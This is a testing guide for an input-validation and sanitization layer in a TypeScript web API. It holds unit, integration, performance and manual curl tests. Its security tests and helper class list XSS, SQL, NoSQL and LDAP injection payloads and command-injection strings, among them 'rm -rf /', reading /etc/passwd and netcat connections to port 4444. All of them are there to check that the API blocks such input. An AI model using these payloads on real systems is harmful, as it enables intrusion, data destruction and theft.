# 🧪 Layer 5 Input Validation & Sanitization - Testing Guide

## Unit Testing

### Validation Service Tests

```typescript
// tests/services/validation.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { ValidationService } from '../../src/services/validation.service';

describe('ValidationService', () => {
  beforeEach(() => {
    // Reset any static state
    ValidationService.resetMetrics();
  });

  describe('User Registration Validation', () => {
    it('should validate correct registration data', async () => {
      const validData = {
        name: 'John Doe',
        email: 'john@example.com',
        password: 'SecurePass123!',
        phone: '+1234567890'
      };

      const result = await ValidationService.validateRequest('register', validData);

      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
      expect(result.threats).toEqual([]);
      expect(result.sanitizedData).toEqual(validData);
    });

    it('should reject invalid email formats', async () => {
      const invalidEmails = [
        'invalid-email',
        'test@',
        '@domain.com',
        'test..test@domain.com',
        'test@domain',
        'test@.com'
      ];

      for (const email of invalidEmails) {
        const result = await ValidationService.validateRequest('register', {
          name: 'Test User',
          email,
          password: 'SecurePass123!'
        });

        expect(result.isValid).toBe(false);
        expect(result.errors).toContain(`Invalid email format: ${email}`);
      }
    });

    it('should enforce password complexity', async () => {
      const weakPasswords = [
        'short',
        'nouppercase123!',
        'NOLOWERCASE123!',
        'NoNumbers!',
        'NoSpecialChars123'
      ];

      for (const password of weakPasswords) {
        const result = await ValidationService.validateRequest('register', {
          name: 'Test User',
          email: 'test@example.com',
          password
        });

        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => error.includes('password'))).toBe(true);
      }
    });

    it('should sanitize name input', async () => {
      const testCases = [
        { input: '  John Doe  ', expected: 'John Doe' },
        { input: 'John<script>alert("xss")</script>Doe', expected: 'John[REMOVED]Doe' },
        { input: 'John & Jane', expected: 'John &amp; Jane' },
        { input: 'O\'Connor', expected: 'O\'Connor' }
      ];

      for (const testCase of testCases) {
        const result = await ValidationService.validateRequest('register', {
          name: testCase.input,
          email: 'test@example.com',
          password: 'SecurePass123!'
        });

        expect(result.isValid).toBe(true);
        expect(result.sanitizedData.name).toBe(testCase.expected);
      }
    });

    it('should detect XSS attempts', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const result = await ValidationService.validateRequest('register', {
          name: payload,
          email: 'test@example.com',
          password: 'SecurePass123!'
        });

        expect(result.threats.length).toBeGreaterThan(0);
        expect(result.threats).toContain('XSS attempt detected');
      }
    });

    it('should detect SQL injection attempts', async () => {
      const sqlPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "' OR 1=1 #"
      ];

      for (const payload of sqlPayloads) {
        const result = await ValidationService.validateRequest('register', {
          name: payload,
          email: 'test@example.com',
          password: 'SecurePass123!'
        });

        expect(result.threats.length).toBeGreaterThan(0);
        expect(result.threats).toContain('SQL injection attempt detected');
      }
    });
  });

  describe('Login Validation', () => {
    it('should validate correct login data', async () => {
      const validData = {
        email: 'user@example.com',
        password: 'password123'
      };

      const result = await ValidationService.validateRequest('login', validData);

      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
      expect(result.sanitizedData).toEqual(validData);
    });

    it('should require email and password', async () => {
      const incompleteData = [
        { email: 'test@example.com' }, // missing password
        { password: 'password123' }, // missing email
        {} // missing both
      ];

      for (const data of incompleteData) {
        const result = await ValidationService.validateRequest('login', data);

        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Custom Validation Rules', () => {
    it('should validate Indonesian phone numbers', async () => {
      const phoneTestCases = [
        { phone: '+62812345678', valid: true },
        { phone: '08123456789', valid: true },
        { phone: '62812345678', valid: true },
        { phone: '+1234567890', valid: false }, // not Indonesian
        { phone: '123', valid: false }, // too short
        { phone: 'invalid-phone', valid: false }
      ];

      for (const testCase of phoneTestCases) {
        const result = await ValidationService.validateRequest('register', {
          name: 'Test User',
          email: 'test@example.com',
          password: 'SecurePass123!',
          phone: testCase.phone
        });

        if (testCase.valid) {
          expect(result.isValid).toBe(true);
        } else {
          expect(result.isValid).toBe(false);
          expect(result.errors.some(error => error.includes('phone'))).toBe(true);
        }
      }
    });

    it('should validate date formats', async () => {
      const dateTestCases = [
        { date: '2024-12-25', valid: true },
        { date: '2024-02-29', valid: true }, // valid leap year
        { date: '2023-02-29', valid: false }, // invalid leap year
        { date: '2024-13-01', valid: false }, // invalid month
        { date: '2024-01-32', valid: false }, // invalid day
        { date: 'invalid-date', valid: false }
      ];

      for (const testCase of dateTestCases) {
        const result = await ValidationService.validateRequest('booking', {
          trainId: 'TRN001',
          departureDate: testCase.date,
          passengers: [{ name: 'Test Passenger' }]
        });

        if (testCase.valid) {
          expect(result.isValid).toBe(true);
        } else {
          expect(result.isValid).toBe(false);
        }
      }
    });
  });
});
```

### Validation Middleware Tests

```typescript
// tests/middleware/validation.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { Hono } from 'hono';
import { createValidationMiddleware } from '../../src/middleware/form-validation.middleware';
import { ValidationService } from '../../src/services/validation.service';

vi.mock('../../src/services/validation.service');

describe('Validation Middleware', () => {
  let app: Hono;

  beforeEach(() => {
    app = new Hono();
    vi.clearAllMocks();
  });

  it('should pass valid requests to next middleware', async () => {
    // Mock successful validation
    vi.mocked(ValidationService.validateRequest).mockResolvedValue({
      isValid: true,
      errors: [],
      threats: [],
      sanitizedData: { name: 'John Doe', email: 'john@example.com' }
    });

    app.use('/test', createValidationMiddleware('register'));
    app.post('/test', (c) => {
      const data = c.get('validatedData');
      return c.json({ success: true, data });
    });

    const res = await app.request('/test', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'John Doe', email: 'john@example.com' })
    });

    expect(res.status).toBe(200);
    
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.data.name).toBe('John Doe');
  });

  it('should block invalid requests', async () => {
    // Mock validation failure
    vi.mocked(ValidationService.validateRequest).mockResolvedValue({
      isValid: false,
      errors: ['Invalid email format'],
      threats: [],
      sanitizedData: {}
    });

    app.use('/test', createValidationMiddleware('register'));
    app.post('/test', (c) => c.json({ success: true }));

    const res = await app.request('/test', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'John', email: 'invalid-email' })
    });

    expect(res.status).toBe(400);
    
    const body = await res.json();
    expect(body.success).toBe(false);
    expect(body.errors).toContain('Invalid email format');
  });

  it('should block requests with security threats', async () => {
    // Mock threat detection
    vi.mocked(ValidationService.validateRequest).mockResolvedValue({
      isValid: true,
      errors: [],
      threats: ['XSS attempt detected'],
      sanitizedData: { name: 'John', email: 'john@example.com' }
    });

    app.use('/test', createValidationMiddleware('register'));
    app.post('/test', (c) => c.json({ success: true }));

    const res = await app.request('/test', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        name: '<script>alert("xss")</script>', 
        email: 'john@example.com' 
      })
    });

    expect(res.status).toBe(400);
    
    const body = await res.json();
    expect(body.success).toBe(false);
    expect(body.code).toBe('SECURITY_THREAT');
  });

  it('should handle validation service errors', async () => {
    // Mock service error
    vi.mocked(ValidationService.validateRequest).mockRejectedValue(
      new Error('Validation service error')
    );

    app.use('/test', createValidationMiddleware('register'));
    app.post('/test', (c) => c.json({ success: true }));

    const res = await app.request('/test', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'John', email: 'john@example.com' })
    });

    expect(res.status).toBe(500);
    
    const body = await res.json();
    expect(body.success).toBe(false);
    expect(body.message).toContain('Validation processing error');
  });
});
```

## Integration Testing

### End-to-End Validation Tests

```typescript
// tests/integration/validation-flow.test.ts
import { describe, it, expect, beforeEach } from 'vitest';

describe('Validation Flow Integration', () => {
  beforeEach(async () => {
    await resetTestDatabase();
  });

  it('should complete secure registration flow', async () => {
    const registrationData = {
      name: 'Test User',
      email: 'test@example.com',
      password: 'SecurePass123!',
      phone: '+628123456789',
      captchaToken: 'valid-token'
    };

    const res = await fetch('http://localhost:3000/api/v1/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(registrationData)
    });

    expect(res.status).toBe(201);
    
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.data.email).toBe('test@example.com');
    expect(body.data.name).toBe('Test User');
  });

  it('should block malicious registration attempts', async () => {
    const maliciousData = {
      name: '<script>alert("xss")</script>',
      email: 'test@example.com',
      password: 'SecurePass123!',
      phone: '+628123456789',
      captchaToken: 'valid-token'
    };

    const res = await fetch('http://localhost:3000/api/v1/auth/register', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(maliciousData)
    });

    expect(res.status).toBe(400);
    
    const body = await res.json();
    expect(body.success).toBe(false);
    expect(body.message).toContain('Security threats detected');
  });

  it('should validate and process booking creation', async () => {
    // Create user and login first
    const { accessToken } = await createUserAndLogin();

    const bookingData = {
      trainId: 'TRN001',
      departureDate: '2024-12-25',
      passengers: [
        { name: 'John Doe', idNumber: '1234567890123456' },
        { name: 'Jane Doe', idNumber: '9876543210987654' }
      ],
      seatClass: 'economy'
    };

    const res = await fetch('http://localhost:3000/api/v1/bookings', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${accessToken}`
      },
      body: JSON.stringify(bookingData)
    });

    expect(res.status).toBe(201);
    
    const body = await res.json();
    expect(body.success).toBe(true);
    expect(body.data.passengers).toHaveLength(2);
  });

  it('should sanitize and validate file uploads', async () => {
    const { accessToken } = await createUserAndLogin();

    // Test safe file upload
    const formData = new FormData();
    const file = new File(['test content'], 'profile.jpg', { type: 'image/jpeg' });
    formData.append('file', file);
    formData.append('description', 'Profile photo');

    const res = await fetch('http://localhost:3000/api/v1/users/avatar', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${accessToken}`
      },
      body: formData
    });

    expect(res.status).toBe(200);
  });

  it('should block dangerous file uploads', async () => {
    const { accessToken } = await createUserAndLogin();

    // Test malicious file upload
    const formData = new FormData();
    const maliciousFile = new File(
      ['<?php echo "hacked"; ?>'], 
      'malicious.php', 
      { type: 'application/x-php' }
    );
    formData.append('file', maliciousFile);

    const res = await fetch('http://localhost:3000/api/v1/users/avatar', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${accessToken}`
      },
      body: formData
    });

    expect(res.status).toBe(400);
    
    const body = await res.json();
    expect(body.message).toContain('file type');
  });
});
```

## Security Testing

### Injection Attack Tests

```typescript
describe('Injection Attack Prevention', () => {
  it('should prevent SQL injection in all fields', async () => {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT password FROM users --",
      "admin'; DELETE FROM users WHERE '1'='1"
    ];

    for (const payload of sqlPayloads) {
      const testFields = [
        { name: payload, email: 'test@example.com', password: 'SecurePass123!' },
        { name: 'Test', email: payload, password: 'SecurePass123!' },
        { name: 'Test', email: 'test@example.com', password: payload }
      ];

      for (const data of testFields) {
        const res = await fetch('http://localhost:3000/api/v1/auth/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ ...data, captchaToken: 'valid-token' })
        });

        expect(res.status).toBe(400);
        
        const body = await res.json();
        expect(body.message).toContain('Security threats detected');
      }
    }
  });

  it('should prevent XSS attacks in all input fields', async () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      '"><script>alert("xss")</script><"'
    ];

    for (const payload of xssPayloads) {
      const res = await fetch('http://localhost:3000/api/v1/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: payload,
          email: 'test@example.com',
          password: 'SecurePass123!',
          captchaToken: 'valid-token'
        })
      });

      expect(res.status).toBe(400);
    }
  });

  it('should prevent NoSQL injection attempts', async () => {
    const nosqlPayloads = [
      { $ne: null },
      { $gt: '' },
      { $regex: '.*' },
      '{"$ne": null}',
      '{"$gt": ""}'
    ];

    for (const payload of nosqlPayloads) {
      const res = await fetch('http://localhost:3000/api/v1/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: payload,
          password: 'password123'
        })
      });

      expect(res.status).toBe(400);
    }
  });

  it('should prevent LDAP injection', async () => {
    const ldapPayloads = [
      '*)(uid=*',
      '*)(|(password=*))',
      '*))(|(cn=*',
      '*)|(objectClass=*'
    ];

    for (const payload of ldapPayloads) {
      const res = await fetch('http://localhost:3000/api/v1/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: payload,
          email: 'test@example.com',
          password: 'SecurePass123!',
          captchaToken: 'valid-token'
        })
      });

      expect(res.status).toBe(400);
    }
  });
});
```

## Performance Testing

### Validation Performance Tests

```typescript
describe('Validation Performance', () => {
  it('should validate requests efficiently', async () => {
    const startTime = Date.now();
    
    const promises = [];
    for (let i = 0; i < 100; i++) {
      promises.push(
        ValidationService.validateRequest('register', {
          name: `User ${i}`,
          email: `user${i}@example.com`,
          password: 'SecurePass123!'
        })
      );
    }

    const results = await Promise.all(promises);
    const endTime = Date.now();

    const totalTime = endTime - startTime;
    const averageTime = totalTime / 100;

    expect(averageTime).toBeLessThan(10); // Less than 10ms per validation
    
    // All should be valid
    results.forEach(result => {
      expect(result.isValid).toBe(true);
    });
  });

  it('should handle complex validation rules efficiently', async () => {
    const complexData = {
      name: 'Very Long Name With Multiple Words And Special Characters',
      email: 'very.long.email.address.with.multiple.dots@very-long-domain-name.com',
      password: 'VeryComplexPasswordWithManyCharacters123!@#$%^&*()',
      phone: '+1234567890123456789',
      address: {
        street: 'Very Long Street Name With Numbers 12345',
        city: 'Very Long City Name',
        state: 'Very Long State Name',
        zipCode: '12345-6789',
        country: 'Very Long Country Name'
      },
      preferences: {
        newsletter: true,
        notifications: false,
        language: 'en-US',
        timezone: 'America/New_York'
      }
    };

    const startTime = Date.now();
    
    const promises = [];
    for (let i = 0; i < 50; i++) {
      promises.push(
        ValidationService.validateRequest('complexRegistration', {
          ...complexData,
          email: `user${i}@example.com`
        })
      );
    }

    await Promise.all(promises);
    const endTime = Date.now();

    const totalTime = endTime - startTime;
    const averageTime = totalTime / 50;

    expect(averageTime).toBeLessThan(50); // Less than 50ms per complex validation
  });

  it('should handle concurrent validation requests', async () => {
    const promises = [];
    
    // Create 200 concurrent validation requests
    for (let i = 0; i < 200; i++) {
      promises.push(
        fetch('http://localhost:3000/api/v1/auth/register', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: `User ${i}`,
            email: `user${i}@example.com`,
            password: 'SecurePass123!',
            captchaToken: 'valid-token'
          })
        })
      );
    }

    const startTime = Date.now();
    const responses = await Promise.all(promises);
    const endTime = Date.now();

    const totalTime = endTime - startTime;
    
    // Should complete within reasonable time
    expect(totalTime).toBeLessThan(10000); // 10 seconds

    // Check success rate
    const successCount = responses.filter(r => r.status === 201).length;
    expect(successCount).toBeGreaterThan(180); // At least 90% success
  });
});
```

## Manual Testing

### Validation Testing Script

```bash
#!/bin/bash
# test-input-validation.sh

echo "Testing Input Validation & Sanitization..."

BASE_URL="http://localhost:3000/api/v1"

echo "1. Testing valid registration..."
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "name": "John Doe",
       "email": "john@example.com",
       "password": "SecurePass123!",
       "phone": "+628123456789",
       "captchaToken": "valid-token"
     }' \
     -w "Status: %{http_code}\n" \
     -s "$BASE_URL/auth/register" | tail -1

echo -e "\n2. Testing XSS prevention..."
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "name": "<script>alert(\"xss\")</script>",
       "email": "test@example.com",
       "password": "SecurePass123!",
       "captchaToken": "valid-token"
     }' \
     -w "Status: %{http_code}\n" \
     -s "$BASE_URL/auth/register" | tail -1

echo -e "\n3. Testing SQL injection prevention..."
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "name": "Test User",
       "email": "test@example.com",
       "password": "'\''OR '\''1'\''='\''1",
       "captchaToken": "valid-token"
     }' \
     -w "Status: %{http_code}\n" \
     -s "$BASE_URL/auth/register" | tail -1

echo -e "\n4. Testing invalid email format..."
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "name": "Test User",
       "email": "invalid-email",
       "password": "SecurePass123!",
       "captchaToken": "valid-token"
     }' \
     -w "Status: %{http_code}\n" \
     -s "$BASE_URL/auth/register" | tail -1

echo -e "\n5. Testing weak password..."
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "name": "Test User",
       "email": "test2@example.com",
       "password": "weak",
       "captchaToken": "valid-token"
     }' \
     -w "Status: %{http_code}\n" \
     -s "$BASE_URL/auth/register" | tail -1

echo -e "\n6. Testing missing required fields..."
curl -X POST \
     -H "Content-Type: application/json" \
     -d '{
       "name": "Test User",
       "captchaToken": "valid-token"
     }' \
     -w "Status: %{http_code}\n" \
     -s "$BASE_URL/auth/register" | tail -1

echo -e "\n7. Testing very long input..."
LONG_NAME=$(printf 'A%.0s' {1..1000})
curl -X POST \
     -H "Content-Type: application/json" \
     -d "{
       \"name\": \"$LONG_NAME\",
       \"email\": \"test3@example.com\",
       \"password\": \"SecurePass123!\",
       \"captchaToken\": \"valid-token\"
     }" \
     -w "Status: %{http_code}\n" \
     -s "$BASE_URL/auth/register" | tail -1
```

### Security Testing Tools

```typescript
// Security testing utility
export class SecurityTestHelper {
  static readonly XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    'javascript:alert("xss")',
    '<img src="x" onerror="alert(1)">',
    '<svg onload="alert(1)">',
    '<iframe src="javascript:alert(1)"></iframe>',
    '"><script>alert("xss")</script><"',
    '\'">\'>"><script>alert("xss")</script>',
    '<body onload="alert(1)">',
    '<input onfocus="alert(1)" autofocus>'
  ];

  static readonly SQL_PAYLOADS = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR 1=1 --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "' OR 'a'='a",
    "1' OR '1'='1' /*",
    "' OR 1=1#"
  ];

  static readonly COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",
    "; rm -rf /",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    "; nc -l -p 4444",
    "| nc 192.168.1.1 4444"
  ];

  static async testFieldForVulnerability(
    endpoint: string,
    field: string,
    payloads: string[]
  ): Promise<{ vulnerable: boolean; details: string[] }> {
    const results = [];
    let vulnerableCount = 0;

    for (const payload of payloads) {
      const testData = {
        [field]: payload,
        ...this.getDefaultFieldValues(field)
      };

      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(testData)
        });

        if (response.status === 200 || response.status === 201) {
          vulnerableCount++;
          results.push(`VULNERABLE: ${field} accepted payload: ${payload}`);
        } else {
          results.push(`BLOCKED: ${field} rejected payload: ${payload}`);
        }
      } catch (error) {
        results.push(`ERROR: ${field} with payload ${payload}: ${error.message}`);
      }
    }

    return {
      vulnerable: vulnerableCount > 0,
      details: results
    };
  }

  private static getDefaultFieldValues(excludeField: string): any {
    const defaults = {
      name: 'Test User',
      email: 'test@example.com',
      password: 'SecurePass123!',
      captchaToken: 'valid-token'
    };

    delete defaults[excludeField];
    return defaults;
  }

  static async runComprehensiveSecurityTest(endpoint: string): Promise<void> {
    console.log(`Running comprehensive security test on ${endpoint}...`);

    const fields = ['name', 'email', 'password'];
    const testSuites = [
      { name: 'XSS', payloads: this.XSS_PAYLOADS },
      { name: 'SQL Injection', payloads: this.SQL_PAYLOADS },
      { name: 'Command Injection', payloads: this.COMMAND_INJECTION_PAYLOADS }
    ];

    for (const field of fields) {
      console.log(`\nTesting field: ${field}`);
      
      for (const suite of testSuites) {
        console.log(`  Testing ${suite.name}...`);
        
        const result = await this.testFieldForVulnerability(
          endpoint,
          field,
          suite.payloads
        );

        if (result.vulnerable) {
          console.error(`  ❌ VULNERABLE to ${suite.name} in ${field}!`);
        } else {
          console.log(`  ✅ Protected against ${suite.name} in ${field}`);
        }
      }
    }
  }
}
```

## Test Data & Utilities

### Validation Test Helpers

```typescript
// tests/utils/validation-helpers.ts
export class ValidationTestHelper {
  static createValidRegistrationData(): any {
    return {
      name: 'John Doe',
      email: 'john@example.com',
      password: 'SecurePass123!',
      phone: '+628123456789',
      captchaToken: 'valid-token'
    };
  }

  static createInvalidDataSets(): any[] {
    return [
      // Missing required fields
      { name: 'John Doe' },
      { email: 'john@example.com' },
      { password: 'SecurePass123!' },
      
      // Invalid formats
      { ...this.createValidRegistrationData(), email: 'invalid-email' },
      { ...this.createValidRegistrationData(), password: 'weak' },
      { ...this.createValidRegistrationData(), phone: 'invalid-phone' },
      
      // Empty values
      { ...this.createValidRegistrationData(), name: '' },
      { ...this.createValidRegistrationData(), email: '' },
      { ...this.createValidRegistrationData(), password: '' }
    ];
  }

  static createMaliciousDataSets(): any[] {
    return [
      // XSS attempts
      { 
        ...this.createValidRegistrationData(), 
        name: '<script>alert("xss")</script>' 
      },
      
      // SQL injection attempts
      { 
        ...this.createValidRegistrationData(), 
        email: "'; DROP TABLE users; --" 
      },
      
      // Command injection attempts
      { 
        ...this.createValidRegistrationData(), 
        name: '; cat /etc/passwd' 
      }
    ];
  }

  static async testValidationEndpoint(
    endpoint: string,
    testDataSets: any[],
    expectedStatus: number
  ): Promise<boolean> {
    for (const data of testDataSets) {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });

      if (response.status !== expectedStatus) {
        console.error(`Unexpected status for data:`, data);
        console.error(`Expected: ${expectedStatus}, Got: ${response.status}`);
        return false;
      }
    }

    return true;
  }
}
```

---

**Coverage**: Input validation, Sanitization, Injection prevention, Performance testing
**Completed**: All 5 PENTA security layer testing documentation
